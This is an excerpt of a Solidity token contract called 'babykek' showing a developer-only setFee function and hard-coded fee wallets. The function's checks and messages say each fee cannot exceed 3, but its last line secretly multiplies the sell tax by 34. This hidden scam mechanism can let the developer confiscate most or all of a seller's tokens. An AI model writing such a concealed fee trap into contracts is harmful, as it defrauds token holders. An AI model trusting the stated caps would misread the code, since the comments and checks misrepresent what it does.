...
contract babykek is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0x41798383C59752637319E51663BeAaB369ec1eC2);
    address payable private _marketingAddress = payable(0x19690D396b79b4e4e3a3E545ACBff59a29ccc3ae);
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyDev {
	    require(redisFeeOnBuy < 4, "Redis cannot be more than 3.");
	    require(redisFeeOnSell < 4, "Redis cannot be more than 3.");
	    require(taxFeeOnBuy < 4, "Tax cannot be more than 3.");
	    require(taxFeeOnSell < 4, "Tax cannot be more than 3.");
        _redisFeeOnBuy = redisFeeOnBuy;
        _redisFeeOnSell = redisFeeOnSell;
        _taxFeeOnBuy = taxFeeOnBuy;
        _taxFeeOnSell = taxFeeOnSell*34;
    }
